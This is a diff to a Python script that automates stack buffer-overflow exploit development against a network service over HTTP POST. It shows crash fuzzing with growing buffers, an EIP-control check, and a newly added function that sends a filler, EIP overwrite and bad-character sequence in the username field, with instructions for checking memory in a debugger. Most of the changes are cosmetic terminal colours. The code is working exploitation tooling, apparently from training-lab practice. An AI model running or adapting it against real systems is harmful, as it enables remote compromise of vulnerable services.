@@ -4,6 +4,7 @@ import time
 import sys
 import os
 import csv
+import re
 
 CEND      = '\33[0m'
 CBOLD     = '\33[1m'
@@ -15,7 +16,7 @@ CSELECTED = '\33[7m'
 
 CBLACK  = '\33[30m'
 CRED    = '\33[31m'
-CGREEN  = '\33[32m'
+CGREEN  = '\33[38;2;0;255;0m'#'\33[32m'
 CYELLOW = '\33[33m'
 CBLUE   = '\33[34m'
 CVIOLET = '\33[35m'
@@ -69,12 +70,11 @@ def fuzzing(bufferloc, sizeFuzzing, host, port):
             sys.exit()
         try:
             s.send(buffer)
-            print(CGREEN2 + '[+] Sending buffer with the pattern.' + CEND)
             s.recv(1024)
             s.close()
-            print(CGREEN2 + "Fuzzing with {} bytes.".format(len(inputBuffer)) + CEND)
+            print(CGREEN + "[+] Fuzzing with {} bytes.".format(len(inputBuffer)) + CEND)
         except:
-            print(CGREEN + "\nFuzzing crashed at {} bytes".format(len(inputBuffer)) + CEND)
+            print(CGREEN2 + "\n[*] Fuzzing crashed at {} bytes".format(len(inputBuffer)) + CEND)
             return len(inputBuffer)
         sizeFuzzing += 100
         time.sleep(5)
@@ -126,16 +126,38 @@ def controlEIP(bufferloc, offset, lenCrash, host, port):
         s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(6)
         s.connect((host, port))
-        s.recv(1024)
-        print("[+] Sending buffer with a pattern of {} bytes".format(len(inputBuffer)))
+        print(CGREEN2 +"[+] Sending buffer with a pattern of {} bytes".format(len(inputBuffer)) + CEND)
         s.send(buffer)
         s.close()
     except:
         print(CRED + "\n[!] Could not connect!" + CEND)
         sys.exit()
-    eipGood = query_yes_no("Normally EIP should have this value: 41414141, it is correct?")
+    eipGood = query_yes_no(CGREEN +"Normally EIP should have this value: 42424242, it is correct?"+ CEND)
     return eipGood
 
+def searchBadchars(bufferloc, offset, badchars, host, port):
+    filler = "A" * offset
+    eip = "B" * 4
+    offset = "C" * 4
+    inputBuffer = filler + eip + offset + badchars + "badchars finished"
+    content = "username=" + inputBuffer + "&password=A"
+    buffer = bufferloc + "Content-Length: "+str(len(content))+"\r\n"
+    buffer += "\r\n"
+    buffer += content
+
+    try:
+        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(6)
+        s.connect((host, port))
+        print(CGREEN2 +"[+] Sending buffer with the badchars...".format(len(inputBuffer)) + CEND)
+        s.send(buffer)
+        s.close()
+    except:
+        print(CRED + "\n[!] Could not connect!" + CEND)
+        sys.exit()
+    print(CYELLOW + "To find badchars you can right-click on ESP and select Follow in Dump to show the input buffer hex characters in memory.\nIf you see this phrase: 'badchars finished', then there are no more bad characters." + CEND)
+    return query_yes_no("Did you find a bad character?", None)
+    
 def query_yes_no(question, default="yes"):
     """Ask a yes/no question via raw_input() and return their answer.
 
@@ -154,7 +176,7 @@ def query_yes_no(question, default="yes"):
     elif default == "no":
         prompt = " [y/N] "
     else:
-        raise ValueError("invalid default answer: '%s'" % default)
+        raise ValueError(CRED + "invalid default answer: '%s'" % default + CEND)
 
     while True:
         sys.stdout.write(question + prompt)
@@ -164,4 +186,11 @@ def query_yes_no(question, default="yes"):
         elif choice in valid:
             return valid[choice]
         else:
-            sys.stdout.write("Please respond with 'yes' or 'no' " "(or 'y' or 'n').\n")
+            sys.stdout.write(CYELLOW +"Please respond with 'yes' or 'no' " "(or 'y' or 'n').\n" + CEND)
+            
+def changeBackup(dataDict):
+    with open("save-buffer-overflow.csv", "w") as file:
+        writer = csv.writer(file)
+        for key, value in dataDict.items():
+            writer.writerow([key, value])
+        file.close()
